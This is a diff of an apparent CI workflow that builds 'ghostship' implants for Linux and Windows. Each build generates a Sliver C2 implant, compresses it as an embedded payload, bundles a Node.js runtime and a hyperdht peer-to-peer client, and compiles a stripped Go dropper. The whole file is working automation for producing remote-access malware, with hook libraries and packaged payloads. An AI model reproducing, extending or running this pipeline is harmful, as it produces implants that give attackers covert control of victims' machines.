@@ -46,23 +46,31 @@ jobs:
           ls -lh ../libgshook.so
           file ../libgshook.so
 
-      - name: Bundle client.js with dependencies
+      - name: Install and package node_modules with native addons
         run: |
           cd implant/core/assets
-          npm init -y
-          npm install hyperdht
-          npm install -g esbuild
 
-          # Bundle client.js with all dependencies into single file
-          esbuild client.js --bundle --platform=node --target=node20 --outfile=client.bundle.js
+          # Create package.json for dependencies
+          cat > package.json << 'PKGJSON'
+          {
+            "name": "ghostship-client",
+            "version": "1.0.0",
+            "dependencies": {
+              "hyperdht": "^6.0.0"
+            }
+          }
+          PKGJSON
 
-          # Replace client.js with bundled version
-          mv client.bundle.js client.js
+          # Install dependencies (compiles native addons for Linux)
+          npm install --production
 
-          # Verify bundle
-          echo "=== Bundled client.js size ==="
-          ls -lh client.js
-          head -5 client.js
+          # Create tarball of node_modules
+          tar -czf node_modules.tar.gz node_modules
+
+          # Verify
+          ls -lh node_modules.tar.gz
+          echo "=== Native addons included ==="
+          find node_modules -name "*.node" -type f
 
       - name: Download Node.js Linux x64
         run: |
@@ -132,9 +140,10 @@ jobs:
           # Compress Sliver payload
           gzip -c sliver-implant-linux > implant/core/assets/payload.gz
 
-          # Verify all assets
+          # Verify all assets (node_modules.tar.gz already created)
           echo "=== Assets ==="
           ls -lh implant/core/assets/
+          ls -lh implant/core/assets/*.gz implant/core/assets/*.tar.gz
 
       - name: Build Linux Implant
         working-directory: implant
@@ -153,7 +162,7 @@ jobs:
 
   build-windows:
     name: Build Windows Implant
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     permissions:
       contents: write
     steps:
@@ -170,33 +179,44 @@ jobs:
         with:
           node-version: '20'
 
-      - name: Bundle client-windows.js with dependencies
+      - name: Install and package node_modules with native addons (Windows)
+        shell: pwsh
         run: |
           cd implant/core/assets
-          npm init -y
-          npm install hyperdht
-          npm install -g esbuild
 
-          # Bundle client-windows.js with all dependencies into single file
-          esbuild client-windows.js --bundle --platform=node --target=node20 --outfile=client-windows.bundle.js
+          # Create package.json
+          @"
+          {
+            "name": "ghostship-client",
+            "version": "1.0.0",
+            "dependencies": {
+              "hyperdht": "^6.0.0"
+            }
+          }
+          "@ | Out-File -FilePath package.json -Encoding utf8
 
-          # Replace with bundled version
-          mv client-windows.bundle.js client-windows.js
+          # Install dependencies (compiles native addons for Windows)
+          npm install --production
 
-          # Verify bundle
-          echo "=== Bundled client-windows.js size ==="
-          ls -lh client-windows.js
+          # Create tarball of node_modules
+          tar -czf node_modules.tar.gz node_modules
+
+          # Verify
+          Get-ChildItem node_modules.tar.gz
+          Get-ChildItem -Recurse -Filter "*.node" node_modules
 
       - name: Download Node.js Windows x64
+        shell: pwsh
         run: |
-          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-win-x64.zip" -o node-windows.zip
-          unzip -q node-windows.zip
-          mv node-v${NODE_VERSION}-win-x64/node.exe node-windows.exe
-          ls -lh node-windows.exe
+          Invoke-WebRequest -Uri "https://nodejs.org/dist/v$env:NODE_VERSION/node-v$env:NODE_VERSION-win-x64.zip" -OutFile node-windows.zip
+          Expand-Archive -Path node-windows.zip -DestinationPath .
+          Move-Item "node-v$env:NODE_VERSION-win-x64/node.exe" node-windows.exe
+          Get-ChildItem node-windows.exe
 
-      - name: Download Sliver and Generate Windows Implant
+      - name: Generate Windows Sliver Implant
+        shell: bash
         run: |
-          # Download Sliver server
+          # Download Sliver server (Linux version to generate implant)
           curl -fsSL "https://github.com/BishopFox/sliver/releases/download/v${SLIVER_VERSION}/sliver-server_linux" -o sliver-server
           chmod +x sliver-server
 
@@ -245,26 +265,39 @@ jobs:
           kill $SLIVER_PID 2>/dev/null || true
 
       - name: Bundle Windows Assets
+        shell: pwsh
         run: |
           # Compress Node.js runtime
-          gzip -c node-windows.exe > implant/core/assets/node.gz
+          $nodeContent = [System.IO.File]::ReadAllBytes("node-windows.exe")
+          $ms = New-Object System.IO.MemoryStream
+          $gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+          $gz.Write($nodeContent, 0, $nodeContent.Length)
+          $gz.Close()
+          [System.IO.File]::WriteAllBytes("implant/core/assets/node.gz", $ms.ToArray())
 
           # Compress Sliver payload
-          gzip -c sliver-implant-windows.exe > implant/core/assets/payload.gz
+          $payloadContent = [System.IO.File]::ReadAllBytes("sliver-implant-windows.exe")
+          $ms2 = New-Object System.IO.MemoryStream
+          $gz2 = New-Object System.IO.Compression.GZipStream($ms2, [System.IO.Compression.CompressionMode]::Compress)
+          $gz2.Write($payloadContent, 0, $payloadContent.Length)
+          $gz2.Close()
+          [System.IO.File]::WriteAllBytes("implant/core/assets/payload.gz", $ms2.ToArray())
 
-          # Use Windows-specific bundled client
-          cp implant/core/assets/client-windows.js implant/core/assets/client.js
+          # Use Windows-specific client
+          Copy-Item implant/core/assets/client-windows.js implant/core/assets/client.js
 
-          ls -lh implant/core/assets/
+          Get-ChildItem implant/core/assets/
 
       - name: Build Windows Implant
         working-directory: implant
         run: |
           go mod tidy
           mkdir -p dist
-          CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/ghostship-windows.exe main.go
-          ls -lh dist/ghostship-windows.exe
-          file dist/ghostship-windows.exe
+          $env:CGO_ENABLED=0
+          $env:GOOS="windows"
+          $env:GOARCH="amd64"
+          go build -ldflags="-s -w" -o dist/ghostship-windows.exe main.go
+          Get-ChildItem dist/ghostship-windows.exe
 
       - name: Upload Windows Artifact
         uses: actions/upload-artifact@v4
